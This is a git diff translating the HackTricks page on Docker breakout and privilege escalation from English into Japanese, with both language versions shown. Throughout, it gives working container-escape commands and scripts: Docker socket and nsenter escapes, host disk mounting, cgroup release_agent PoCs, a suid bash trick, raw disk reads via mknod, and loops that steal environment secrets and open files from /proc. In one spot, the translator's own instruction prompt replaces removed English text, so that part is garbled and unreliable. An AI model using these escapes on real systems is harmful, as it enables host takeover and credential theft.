@@ -1,46 +1,43 @@
-# Docker Breakout / Privilege Escalation
+# Dockerの脱獄/特権エスカレーション
 
 <details>
 
 <summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
 
-* Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
-* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
-* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-* **Share your hacking tricks by submitting PRs to the** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **and** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud).
+* **サイバーセキュリティ企業**で働いていますか？ **HackTricksで会社を宣伝**したいですか？または、**PEASSの最新バージョンにアクセスしたり、HackTricksをPDFでダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
+* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を見つけてください。独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションです。
+* [**公式のPEASS＆HackTricksグッズ**](https://peass.creator-spring.com)を手に入れましょう。
+* [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter**で**フォロー**してください[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**。**
+* **ハッキングのトリックを共有するには、PRを** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **と** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **に提出してください。**
 
 </details>
 
 ![](<../../../../.gitbook/assets/image (9) (1) (2).png>)
 
 \
-Use [**Trickest**](https://trickest.io/) to easily build and **automate workflows** powered by the world's **most advanced** community tools.\
-Get Access Today:
+[**Trickest**](https://trickest.io/)を使用して、世界で最も高度なコミュニティツールによって強化されたワークフローを簡単に構築し、自動化します。\
+今すぐアクセスを取得：
 
 {% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
 
-## Automatic Enumeration & Escape
+## 自動列挙と脱出
 
-* [**linpeas**](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS): It can also **enumerate containers**
-* [**CDK**](https://github.com/cdk-team/CDK#installationdelivery): This tool is pretty **useful to enumerate the container you are into even try to escape automatically**
-* [**amicontained**](https://github.com/genuinetools/amicontained): Useful tool to get the privileges the container has in order to find ways to escape from it
-* [**deepce**](https://github.com/stealthcopter/deepce): Tool to enumerate and escape from containers
-* [**grype**](https://github.com/anchore/grype): Get the CVEs contained in the software installed in the image
+* [**linpeas**](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS): これは**コンテナを列挙**することもできます
+* [**CDK**](https://github.com/cdk-team/CDK#installationdelivery): このツールは、現在のコンテナを列挙し、自動的に脱出を試みるのに非常に**便利**です
+* [**amicontained**](https://github.com/genuinetools/amicontained): コンテナが持つ特権を取得するための便利なツールで、脱出方法を見つけることができます
+* [**deepce**](https://github.com/stealthcopter/deepce): コンテナの列挙と脱出のためのツール
+* [**grype**](https://github.com/anchore/grype): イメージにインストールされているソフトウェアに含まれるCVEを取得します
 
-## Mounted Docker Socket Escape
+## マウントされたDockerソケットの脱出
 
-If somehow you find that the **docker socket is mounted** inside the docker container, you will be able to escape from it.\
-This usually happen in docker containers that for some reason need to connect to docker daemon to perform actions.
-
+もし何らかの理由で、Dockerコンテナ内に**Dockerソケットがマウントされている**ことがわかった場合、それから脱出することができます。\
+これは通常、何らかの理由でDockerデーモンに接続してアクションを実行する必要があるDockerコンテナで発生します。
 ```bash
 #Search the socket
 find / -name docker.sock 2>/dev/null
 #It's usually in /run/docker.sock
 ```
-
-In this case you can use regular docker commands to communicate with the docker daemon:
-
+この場合、通常のDockerコマンドを使用してDockerデーモンと通信することができます。
 ```bash
 #List images to use one
 docker images
@@ -54,43 +51,40 @@ nsenter --target 1 --mount --uts --ipc --net --pid -- bash
 # Get full privs in container without --privileged
 docker run -it -v /:/host/ --cap-add=ALL --security-opt apparmor=unconfined --security-opt seccomp=unconfined --security-opt label:disable --pid=host --userns=host --uts=host --cgroupns=host ubuntu chroot /host/ bash
 ```
-
 {% hint style="info" %}
-In case the **docker socket is in an unexpected place** you can still communicate with it using the **`docker`** command with the parameter **`-H unix:///path/to/docker.sock`**
+予期しない場所に**dockerソケット**がある場合は、パラメータ**`-H unix:///path/to/docker.sock`**を使用して**`docker`**コマンドを使用してそれと通信することができます。
 {% endhint %}
 
-Docker daemon might be also [listening in a port (by default 2375, 2376)](../../../../network-services-pentesting/2375-pentesting-docker.md) or on Systemd-based systems, communication with the Docker daemon can occur over the Systemd socket `fd://`.
+Dockerデーモンは、[デフォルトでポート（2375、2376）でリスニングすることもあります](../../../../network-services-pentesting/2375-pentesting-docker.md)。また、Systemdベースのシステムでは、Dockerデーモンとの通信はSystemdソケット`fd://`を介して行われる場合があります。
 
 {% hint style="info" %}
-Additionally, pay attention to the runtime sockets of other high-level runtimes:
+さらに、他のハイレベルランタイムのランタイムソケットにも注意してください：
 
-* dockershim: `unix:///var/run/dockershim.sock`
-* containerd: `unix:///run/containerd/containerd.sock`
-* cri-o: `unix:///var/run/crio/crio.sock`
-* frakti: `unix:///var/run/frakti.sock`
-* rktlet: `unix:///var/run/rktlet.sock`
+* dockershim：`unix:///var/run/dockershim.sock`
+* containerd：`unix:///run/containerd/containerd.sock`
+* cri-o：`unix:///var/run/crio/crio.sock`
+* frakti：`unix:///var/run/frakti.sock`
+* rktlet：`unix:///var/run/rktlet.sock`
 * ...
 {% endhint %}
 
-## Capabilities Abuse Escape
+## Capabilitiesの悪用からの脱出
 
-You should check the capabilities of the container, if it has any of the following ones, you might be able to scape from it: **`CAP_SYS_ADMIN`**_,_ **`CAP_SYS_PTRACE`**, **`CAP_SYS_MODULE`**, **`DAC_READ_SEARCH`**, **`DAC_OVERRIDE, CAP_SYS_RAWIO`, `CAP_SYSLOG`, `CAP_NET_RAW`, `CAP_NET_ADMIN`**
+コンテナのcapabilitiesをチェックする必要があります。以下のいずれかのcapabilitiesがある場合、それから脱出することができるかもしれません：**`CAP_SYS_ADMIN`**、**`CAP_SYS_PTRACE`**、**`CAP_SYS_MODULE`**、**`DAC_READ_SEARCH`**、**`DAC_OVERRIDE, CAP_SYS_RAWIO`**、**`CAP_SYSLOG`**、**`CAP_NET_RAW`**、**`CAP_NET_ADMIN`**
 
-You can check currently container capabilities using **previously mentioned automatic tools** or:
-
+現在のコンテナのcapabilitiesは、**前述の自動ツール**または以下を使用して確認できます：
 ```bash
 capsh --print
 ```
-
-In the following page you can **learn more about linux capabilities** and how to abuse them to escape/escalate privileges:
+以下のページでは、**Linuxの機能について詳しく学び**、それらを悪用して特権を逃れたり特権をエスカレートさせたりする方法について学ぶことができます：
 
 {% content-ref url="../../linux-capabilities.md" %}
 [linux-capabilities.md](../../linux-capabilities.md)
 {% endcontent-ref %}
 
-## Escape from Privileged Containers
+## 特権コンテナからの脱出
 
-A privileged container can be created with the flag `--privileged` or disabling specific defenses:
+特権コンテナは、`--privileged`フラグを使用するか、特定の防御を無効にすることで作成できます：
 
 * `--cap-add=ALL`
 * `--security-opt apparmor=unconfined`
@@ -102,51 +96,44 @@ A privileged container can be created with the flag `--privileged` or disabling 
 * `--cgroupns=host`
 * `Mount /dev`
 
-The `--privileged` flag introduces significant security concerns, and the exploit relies on launching a docker container with it enabled. When using this flag, containers have full access to all devices and lack restrictions from seccomp, AppArmor, and Linux capabilities. You can r**ead all the effects of `--privileged`** in this page:
+`--privileged`フラグは、重大なセキュリティ上の懸念を引き起こし、このフラグを有効にした状態でDockerコンテナを起動することによってエスカレートすることができます。このフラグを使用すると、コンテナはすべてのデバイスに完全なアクセス権を持ち、seccomp、AppArmor、およびLinuxの機能による制限がありません。`--privileged`の効果については、以下のページで**すべての効果を読む**ことができます：
 
 {% content-ref url="../docker-privileged.md" %}
 [docker-privileged.md](../docker-privileged.md)
 {% endcontent-ref %}
 
-### Privileged + hostPID
+### 特権 + hostPID
 
-With these permissions you can just **move to the namespace of a process running in the host as root** like init (pid:1) just running: `nsenter --target 1 --mount --uts --ipc --net --pid -- bash`
+これらの権限を持つ場合、単に`nsenter --target 1 --mount --uts --ipc --net --pid -- bash`を実行することで、rootとしてホストで実行されているプロセス（pid:1）の名前空間に移動することができます。
 
-Test it in a container executing:
-
+コンテナでテストしてみてください。
 ```bash
 docker run --rm -it --pid=host --privileged ubuntu bash
 ```
+### 特権モード
 
-### Privileged
+特権フラグを使用するだけで、ホストのディスクにアクセスしたり、release_agentや他のエスケープを悪用して脱出を試みることができます。
 
-Just with the privileged flag you can try to **access the host's disk** or try to **escape abusing release\_agent or other escapes**.
-
-Test the following bypasses in a container executing:
-
+以下のバイパスをコンテナで実行してテストしてください。
 ```bash
 docker run --rm -it --privileged ubuntu bash
 ```
+#### ディスクのマウント - Poc1
 
-#### Mounting Disk - Poc1
-
-Well configured docker containers won't allow command like **fdisk -l**. However on miss-configured docker command where the flag `--privileged` or `--device=/dev/sda1` with caps is specified, it is possible to get the privileges to see the host drive.
+適切に設定されたDockerコンテナでは、**fdisk -l**のようなコマンドは許可されません。ただし、誤った設定のDockerコマンドでは、`--privileged`フラグまたは`--device=/dev/sda1`フラグと共にキャップスが指定されている場合、ホストドライブを表示するための特権を取得することが可能です。
 
 ![](https://bestestredteam.com/content/images/2019/08/image-16.png)
 
-So to take over the host machine, it is trivial:
-
+したがって、ホストマシンを乗っ取るためには、以下の手順を実行します：
 ```bash
 mkdir -p /mnt/hola
 mount /dev/sda1 /mnt/hola
 ```
+そして、できあがり！ホストのファイルシステムにアクセスできるようになりました。これは、`/mnt/hola`フォルダにマウントされているためです。
 
-And voilà ! You can now access the filesystem of the host because it is mounted in the `/mnt/hola` folder.
+#### ディスクのマウント - Poc2
 
-#### Mounting Disk - Poc2
-
-Within the container, an attacker may attempt to gain further access to the underlying host OS via a writable hostPath volume created by the cluster. Below is some common things you can check within the container to see if you leverage this attacker vector:
-
+コンテナ内では、攻撃者はクラスタによって作成された書き込み可能なhostPathボリュームを介して、基礎となるホストOSへのさらなるアクセスを試みることがあります。以下は、この攻撃ベクトルを利用しているかどうかを確認するためにコンテナ内でチェックできる一般的な項目です。
 ```bash
 ### Check if You Can Write to a File-system
 echo 1 > /proc/sysrq-trigger
@@ -167,10 +154,9 @@ mount: /mnt: permission denied. ---> Failed! but if not, you may have access to 
 ### debugfs (Interactive File System Debugger)
 debugfs /dev/sda1
 ```
+#### 既存のrelease\_agentを悪用した特権エスケープ（[cve-2022-0492](https://unit42.paloaltonetworks.com/cve-2022-0492-cgroups/)）- PoC1
 
-#### Privileged Escape Abusing existent release\_agent ([cve-2022-0492](https://unit42.paloaltonetworks.com/cve-2022-0492-cgroups/)) - PoC1
-
-{% code title="Initial PoC" %}
+{% code title="初期のPoC" %}
 ```bash
 # spawn a new container to exploit via:
 # docker run --rm -it --privileged ubuntu bash
@@ -204,11 +190,9 @@ sh -c "echo 0 > $d/w/cgroup.procs"; sleep 1
 # Reads the output
 cat /o
 ```
-{% endcode %}
+#### 特権エスケープ：作成されたrelease_agentの悪用（[cve-2022-0492](https://unit42.paloaltonetworks.com/cve-2022-0492-cgroups/)）- PoC2
 
-#### Privileged Escape Abusing created release\_agent ([cve-2022-0492](https://unit42.paloaltonetworks.com/cve-2022-0492-cgroups/)) - PoC2
-
-{% code title="Second PoC" %}
+{% code title="セカンドPoC" %}
 ```bash
 # On the host
 docker run --rm -it --cap-add=SYS_ADMIN --security-opt apparmor=unconfined ubuntu bash
@@ -244,7 +228,7 @@ chmod a+x /cmd
 
 # Executes the attack by spawning a process that immediately ends inside the "x" child cgroup
 # By creating a /bin/sh process and writing its PID to the cgroup.procs file in "x" child cgroup directory
-# The script on the host will execute after /bin/sh exits 
+# The script on the host will execute after /bin/sh exits
 sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
 
 # Reads the output
@@ -252,20 +236,7 @@ cat /output
 ```
 {% endcode %}
 
-Find an **explanation of the technique** in:
-
-{% content-ref url="docker-release_agent-cgroups-escape.md" %}
-[docker-release\_agent-cgroups-escape.md](docker-release\_agent-cgroups-escape.md)
-{% endcontent-ref %}
-
-#### Privileged Escape Abusing release\_agent without known the relative path - PoC3
-
-In the previous exploits the **absolute path of the container inside the hosts filesystem is disclosed**. However, this isn’t always the case. In cases where you **don’t know the absolute path of the container inside the host** you can use this technique:
-
-{% content-ref url="release_agent-exploit-relative-paths-to-pids.md" %}
-[release\_agent-exploit-relative-paths-to-pids.md](release\_agent-exploit-relative-paths-to-pids.md)
-{% endcontent-ref %}
-
+以下は、ハッキング技術に関する本のコンテンツです。以下のコンテンツは、/hive/hacktricks/linux-hardening/privilege-escalation/docker-security/docker-breakout-privilege-escalation/README.md ファイルからのものです。関連する英語のテキストを日本語に翻訳し、翻訳を返し、マークダウンとHTMLの構文を正確に保ちます。コード、ハッキング技術の名前、ハッキングの言葉、クラウド/SaaSプラットフォームの名前（Workspace、aws、gcpなど）、'leak'という単語、ペンテスト、およびマークダウンタグなどのものは翻訳しないでください。また、翻訳とマークダウンの構文以外の追加のものは追加しないでください。
 ```bash
 #!/bin/sh
 
@@ -304,20 +275,20 @@ echo 1 > ${CGROUP_MOUNT}/${CGROUP_NAME}/notify_on_release
 TPID=1
 while [ ! -f ${OUTPUT_PATH} ]
 do
-  if [ $((${TPID} % 100)) -eq 0 ]
-  then
-    echo "Checking pid ${TPID}"
-    if [ ${TPID} -gt ${MAX_PID} ]
-    then
-      echo "Exiting at ${MAX_PID} :-("
-      exit 1
-    fi
-  fi
-  # Set the release_agent path to the guessed pid
-  echo "/proc/${TPID}/root${PAYLOAD_PATH}" > ${CGROUP_MOUNT}/release_agent
-  # Trigger execution of the release_agent
-  sh -c "echo \$\$ > ${CGROUP_MOUNT}/${CGROUP_NAME}/cgroup.procs"
-  TPID=$((${TPID} + 1))
+if [ $((${TPID} % 100)) -eq 0 ]
+then
+echo "Checking pid ${TPID}"
+if [ ${TPID} -gt ${MAX_PID} ]
+then
+echo "Exiting at ${MAX_PID} :-("
+exit 1
+fi
+fi
+# Set the release_agent path to the guessed pid
+echo "/proc/${TPID}/root${PAYLOAD_PATH}" > ${CGROUP_MOUNT}/release_agent
+# Trigger execution of the release_agent
+sh -c "echo \$\$ > ${CGROUP_MOUNT}/${CGROUP_NAME}/cgroup.procs"
+TPID=$((${TPID} + 1))
 done
 
 # Wait for and cat the output
@@ -325,9 +296,7 @@ sleep 1
 echo "Done! Output:"
 cat ${OUTPUT_PATH}
 ```
-
-Executing the PoC within a privileged container should provide output similar to:
-
+特権付きコンテナ内でPoCを実行すると、次のような出力が得られるはずです。
 ```bash
 root@container:~$ ./release_agent_pid_brute.sh
 Checking pid 100
@@ -355,37 +324,34 @@ root         9     2  0 11:25 ?        00:00:00 [mm_percpu_wq]
 root        10     2  0 11:25 ?        00:00:00 [ksoftirqd/0]
 ...
 ```
+#### 機密マウントの悪用による特権エスケープ
 
-#### Privileged Escape Abusing Sensitive Mounts
+**ホストの基礎情報を提供する可能性のあるいくつかのファイル**がマウントされている場合があります。これらのファイルのいくつかは、**ホストが何かが起こったときに実行するものを示しているかもしれません**（これにより攻撃者はコンテナから脱出することができます）。
 
-There are several files that might mounted that give **information about the underlaying host**. Some of them may even indicate **something to be executed by the host when something happens** (which will allow a attacker to escape from the container).\
-The abuse of these files may allow that:
+これらのファイルの悪用により、次のことが可能になります：
 
-* release\_agent (already covered before)
-* [binfmt\_misc](sensitive-mounts.md#proc-sys-fs-binfmt\_misc)
-* [core\_pattern](sensitive-mounts.md#proc-sys-kernel-core\_pattern)
-* [uevent\_helper](sensitive-mounts.md#sys-kernel-uevent\_helper)
-* [modprobe](sensitive-mounts.md#proc-sys-kernel-modprobe)
+- release_agent（すでに前述済み）
+- [binfmt_misc](sensitive-mounts.md#proc-sys-fs-binfmt_misc)
+- [core_pattern](sensitive-mounts.md#proc-sys-kernel-core_pattern)
+- [uevent_helper](sensitive-mounts.md#sys-kernel-uevent_helper)
+- [modprobe](sensitive-mounts.md#proc-sys-kernel-modprobe)
 
-However, you can find **other sensitive files** to check for in this page:
+ただし、このページでチェックするための**他の機密ファイル**も見つけることができます：
 
 {% content-ref url="sensitive-mounts.md" %}
 [sensitive-mounts.md](sensitive-mounts.md)
 {% endcontent-ref %}
 
-### Arbitrary Mounts
+### 任意のマウント
 
-In several occasions you will find that the **container has some volume mounted from the host**. If this volume wasn’t correctly configured you might be able to **access/modify sensitive data**: Read secrets, change ssh authorized\_keys…
-
+いくつかの場合、**コンテナにはホストからのボリュームがマウントされている**ことがあります。このボリュームが正しく設定されていない場合、**機密データにアクセス/変更することができる**可能性があります：シークレットの読み取り、sshのauthorized_keysの変更...
 ```bash
 docker run --rm -it -v /:/host ubuntu bash
 ```
+### 2つのシェルとホストマウントによる特権昇格
 
-### Privilege Escalation with 2 shells and host mount
-
-If you have access as **root inside a container** that has some folder from the host mounted and you have **escaped as a non privileged user to the host** and have read access over the mounted folder.\
-You can create a **bash suid file** in the **mounted folder** inside the **container** and **execute it from the host** to privesc.
-
+もし、ホストの一部のフォルダがマウントされたコンテナ内で**rootとしてアクセス**でき、かつ**非特権ユーザーとしてホストにエスケープ**し、マウントされたフォルダに対して読み取りアクセス権がある場合、\
+**コンテナ内のマウントされたフォルダ**に**bash suidファイル**を作成し、ホストからそれを実行することで特権昇格が可能です。
 ```bash
 cp /bin/bash . #From non priv inside mounted folder
 # You need to copy it from the host as the bash binaries might be diferent in the host and in the container
@@ -393,17 +359,15 @@ chown root:root bash #From container as root inside mounted folder
 chmod 4777 bash #From container as root inside mounted folder
 bash -p #From non priv inside mounted folder
 ```
+### 2つのシェルを使用した特権昇格
 
-### Privilege Escalation with 2 shells
+もし、**コンテナ内でrootとしてアクセス**でき、**非特権ユーザーとしてホストから脱出**できた場合、コンテナ内でのMKNODの機能（デフォルトで有効）を悪用して、**ホスト内で特権昇格**を行うことができます。この方法は、[**この記事**](https://labs.f-secure.com/blog/abusing-the-access-to-mount-namespaces-through-procpidroot/)で説明されています。\
+この機能により、コンテナ内のrootユーザーは**ブロックデバイスファイルを作成**することが許可されます。デバイスファイルは、**ハードウェアやカーネルモジュールにアクセス**するために使用される特殊なファイルです。たとえば、/dev/sdaのブロックデバイスファイルは、システムディスクの生データにアクセスすることができます。
 
-If you have access as **root inside a container** and you have **escaped as a non privileged user to the host**, you can abuse both shells to **privesc inside the host** if you have the capability MKNOD inside the container (it's by default) as [**explained in this post**](https://labs.f-secure.com/blog/abusing-the-access-to-mount-namespaces-through-procpidroot/).\
-With such capability the root user within the container is allowed to **create block device files**. Device files are special files that are used to **access underlying hardware & kernel modules**. For example, the /dev/sda block device file gives access to **read the raw data on the systems disk**.
+Dockerは、ブロックデバイスが**コンテナ内から悪用されないように**、コンテナに対してcgroupポリシーを設定して読み書きをブロックします。\
+ただし、もしブロックデバイスが**コンテナ内で作成された場合、コンテナの外部から/proc/PID/root/フォルダを介してアクセス**することができます。ただし、そのプロセスはコンテナの外部と内部で**同じユーザーによって所有されている必要があります**。
 
-Docker ensures that block devices **cannot be abused from within the container** by setting a cgroup policy on the container that blocks read and write of block devices.\
-However, if a block device is **created within the container it can be accessed** through the /proc/PID/root/ folder by someone **outside the container**, the limitation being that the **process must be owned by the same user** outside and inside the container.
-
-**Exploitation** example from this [**writeup**](https://radboudinstituteof.pwning.nl/posts/htbunictfquals2021/goodgames/):
-
+**悪用**の例は、この[**解説記事**](https://radboudinstituteof.pwning.nl/posts/htbunictfquals2021/goodgames/)から引用されています。
 ```bash
 # On the container as root
 cd /
@@ -421,7 +385,7 @@ su: Authentication failure
 (Ignored)
 augustus@3a453ab39d3d:/backend$ /bin/sh
 /bin/sh
-$ 
+$
 ```
 
 ```bash
@@ -436,22 +400,18 @@ augustus  1661  0.0  0.0   6116   648 pts/0    S+   09:48   0:00              \_
 
 # The process ID is 1659 in this case
 # Grep for the sda for HTB{ through the process:
-augustus@GoodGames:~$ grep -a 'HTB{' /proc/1659/root/sda 
+augustus@GoodGames:~$ grep -a 'HTB{' /proc/1659/root/sda
 HTB{7h4T_w45_Tr1cKy_1_D4r3_54y}
 ```
-
 ### hostPID
 
-If you can access the processes of the host you are going to be able to access a lot of sensitive information stored in those processes. Run test lab:
-
+ホストのプロセスにアクセスできる場合、それらのプロセスに格納されている多くの機密情報にアクセスできます。テストラボを実行します：
 ```
 docker run --rm -it --pid=host ubuntu bash
 ```
+たとえば、`ps auxn`のようなものを使用してプロセスをリストアップし、コマンド内の機密情報を検索することができます。
 
-For example, you will be able to list the processes using something like `ps auxn` and search for sensitive details in the commands.
-
-Then, as you can **access each process of the host in /proc/ you can just steal their env secrets** running:
-
+次に、**/proc/の各プロセスにアクセスできるため、envの秘密情報を盗むことができます**。以下のコマンドを実行してください。
 ```bash
 for e in `ls /proc/*/environ`; do echo; echo $e; xargs -0 -L1 -a $e; done
 /proc/988058/environ
@@ -460,9 +420,7 @@ HOSTNAME=argocd-server-69678b4f65-6mmql
 USER=abrgocd
 ...
 ```
-
-You can also **access other processes file descriptors and read their open files**:
-
+他のプロセスのファイルディスクリプタにアクセスし、それらのオープンファイルを読むこともできます。
 ```bash
 for fd in `find /proc/*/fd`; do ls -al $fd/* 2>/dev/null | grep \>; done > fds.txt
 less fds.txt
@@ -472,94 +430,87 @@ lrwx------ 1 root root 64 Jun 15 02:25 /proc/635813/fd/4 -> /.secret.txt.swp
 # You can open the secret filw with:
 cat /proc/635813/fd/4
 ```
-
-You can also **kill processes and cause a DoS**.
+あなたはまた、プロセスを**キルしてDoSを引き起こす**こともできます。
 
 {% hint style="warning" %}
-If you somehow have privileged **access over a process outside of the container**, you could run something like `nsenter --target <pid> --all` or `nsenter --target <pid> --mount --net --pid --cgroup` to **run a shell with the same ns restrictions** (hopefully none) **as that process.**
+もし、コンテナの外部のプロセスに特権のある**アクセス権限を持っている場合**、`nsenter --target <pid> --all`または`nsenter --target <pid> --mount --net --pid --cgroup`のようなコマンドを実行して、そのプロセスと同じns制限（望ましくはなし）を持つシェルを**実行することができます**。
 {% endhint %}
 
 ### hostNetwork
-
 ```
 docker run --rm -it --network=host ubuntu bash
 ```
+もしコンテナがDockerの[ホストネットワーキングドライバ(`--network=host`)](https://docs.docker.com/network/host/)で設定されている場合、そのコンテナのネットワークスタックはDockerホストから分離されていません（コンテナはホストのネットワーキング名前空間を共有しています）し、コンテナには独自のIPアドレスが割り当てられません。言い換えると、**コンテナはすべてのサービスを直接ホストのIPにバインド**します。さらに、コンテナは共有インターフェース上でホストが送受信している**すべてのネットワークトラフィックを傍受**することができます（`tcpdump -i eth0`）。
 
-If a container was configured with the Docker [host networking driver (`--network=host`)](https://docs.docker.com/network/host/), that container's network stack is not isolated from the Docker host (the container shares the host's networking namespace), and the container does not get its own IP-address allocated. In other words, the **container binds all services directly to the host's IP**. Furthermore the container can **intercept ALL network traffic that the host** is sending and receiving on shared interface `tcpdump -i eth0`.
+例えば、これを使用してホストとメタデータインスタンス間のトラフィックを**スニフィングやスプーフィング**することができます。
 
-For instance, you can use this to **sniff and even spoof traffic** between host and metadata instance.
-
-Like in the following examples:
+以下の例のように：
 
 * [Writeup: How to contact Google SRE: Dropping a shell in cloud SQL](https://offensi.com/2020/08/18/how-to-contact-google-sre-dropping-a-shell-in-cloud-sql/)
 * [Metadata service MITM allows root privilege escalation (EKS / GKE)](https://blog.champtar.fr/Metadata\_MITM\_root\_EKS\_GKE/)
 
-You will be able also to access **network services binded to localhost** inside the host or even access the **metadata permissions of the node** (which might be different those a container can access):
+また、ホスト内部で**localhostにバインドされたネットワークサービスにアクセス**したり、ノードの**メタデータの権限にアクセス**することもできます（これはコンテナがアクセスできるものとは異なる場合があります）：
 
 {% content-ref url="../../docker-breakout/docker-breakout-privilege-escalation/broken-reference/" %}
 [broken-reference](../../docker-breakout/docker-breakout-privilege-escalation/broken-reference/)
 {% endcontent-ref %}
 
 ### hostIPC
-
 ```
 docker run --rm -it --ipc=host ubuntu bash
 ```
+もし`hostIPC=true`しか持っていない場合、あなたはほとんど何もできません。ホスト上のプロセスまたは他のポッド内のプロセスがホストの**プロセス間通信メカニズム**（共有メモリ、セマフォ配列、メッセージキューなど）を使用している場合、それらのメカニズムに読み書きすることができます。最初に調べるべき場所は`/dev/shm`です。なぜなら、`hostIPC=true`を持つ任意のポッドとホストで共有されているからです。また、`ipcs`を使用して他のIPCメカニズムもチェックする必要があります。
 
-If you only have `hostIPC=true`, you most likely can't do much. If any process on the host or any processes within another pod is using the host’s **inter-process communication mechanisms** (shared memory, semaphore arrays, message queues, etc.), you'll be able to read/write to those same mechanisms. The first place you'll want to look is `/dev/shm`, as it is shared between any pod with `hostIPC=true` and the host. You'll also want to check out the other IPC mechanisms with `ipcs`.
+* **/dev/shmの調査** - この共有メモリの場所にあるファイルを調べてください：`ls -la /dev/shm`
+* **既存のIPC施設の調査** - `/usr/bin/ipcs`を使用して使用されているIPC施設があるかどうかを確認できます。次のコマンドで確認してください：`ipcs -a`
 
-* **Inspect /dev/shm** - Look for any files in this shared memory location: `ls -la /dev/shm`
-* **Inspect existing IPC facilities** – You can check to see if any IPC facilities are being used with `/usr/bin/ipcs`. Check it with: `ipcs -a`
+### 権限の回復
 
-### Recover capabilities
-
-If the syscall **`unshare`** is not forbidden you can recover all the capabilities running:
-
+もし`unshare`システムコールが禁止されていない場合、次のコマンドを実行することですべての権限を回復することができます：
 ```bash
 unshare -UrmCpf bash
 # Check them with
 cat /proc/self/status | grep CapEff
 ```
+### シンボリックリンクを使用したユーザーネームスペースの乱用
 
-### User namespace abuse via symlink
-
-The second technique explained in the post [https://labs.f-secure.com/blog/abusing-the-access-to-mount-namespaces-through-procpidroot/](https://labs.f-secure.com/blog/abusing-the-access-to-mount-namespaces-through-procpidroot/) indicates how you can abuse bind mounts with user namespaces, to affect files inside the host (in that specific case, delete files).
+[https://labs.f-secure.com/blog/abusing-the-access-to-mount-namespaces-through-procpidroot/](https://labs.f-secure.com/blog/abusing-the-access-to-mount-namespaces-through-procpidroot/)の記事で説明されている2番目のテクニックでは、ユーザーネームスペースを使用してバインドマウントを乱用し、ホスト内のファイル（特定の場合はファイルの削除）に影響を与える方法が示されています。
 
 ![](../../docker-breakout/.gitbook/assets/image%20\(9\)%20\(1\)%20\(2\).png)
 
 \
-Use [**Trickest**](https://trickest.io/) to easily build and **automate workflows** powered by the world's **most advanced** community tools.\
-Get Access Today:
+[**Trickest**](https://trickest.io/)を使用して、世界で最も高度なコミュニティツールによって強化された**ワークフローを簡単に構築**および**自動化**することができます。\
+今すぐアクセスを取得：
 
 {% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
 
-## CVEs
+## CVE
 
 ### Runc exploit (CVE-2019-5736)
 
-In case you can execute `docker exec` as root (probably with sudo), you try to escalate privileges escaping from a container abusing CVE-2019-5736 (exploit [here](https://github.com/Frichetten/CVE-2019-5736-PoC/blob/master/main.go)). This technique will basically **overwrite** the _**/bin/sh**_ binary of the **host** **from a container**, so anyone executing docker exec may trigger the payload.
+`docker exec`をrootとして実行できる場合（おそらくsudoで実行できる場合）、CVE-2019-5736を乱用してコンテナから特権を昇格させることができます（[ここ](https://github.com/Frichetten/CVE-2019-5736-PoC/blob/master/main.go)にあるexploitを使用します）。このテクニックは、基本的にはコンテナからホストの**/bin/sh**バイナリを**上書き**するものであり、docker execを実行するとペイロードがトリガーされます。
 
-Change the payload accordingly and build the main.go with `go build main.go`. The resulting binary should be placed in the docker container for execution.\
-Upon execution, as soon as it displays `[+] Overwritten /bin/sh successfully` you need to execute the following from the host machine:
+ペイロードを適宜変更し、`go build main.go`でmain.goをビルドします。ビルドされたバイナリは、実行のためにdockerコンテナに配置する必要があります。\
+実行すると、`[+] Overwritten /bin/sh successfully`と表示されると、ホストマシンから次のコマンドを実行する必要があります：
 
 `docker exec -it <container-name> /bin/sh`
 
-This will trigger the payload which is present in the main.go file.
+これにより、main.goファイルに存在するペイロードがトリガーされます。
 
-For more information: [https://blog.dragonsector.pl/2019/02/cve-2019-5736-escape-from-docker-and.html](https://blog.dragonsector.pl/2019/02/cve-2019-5736-escape-from-docker-and.html)
+詳細については、[https://blog.dragonsector.pl/2019/02/cve-2019-5736-escape-from-docker-and.html](https://blog.dragonsector.pl/2019/02/cve-2019-5736-escape-from-docker-and.html)を参照してください。
 
 {% hint style="info" %}
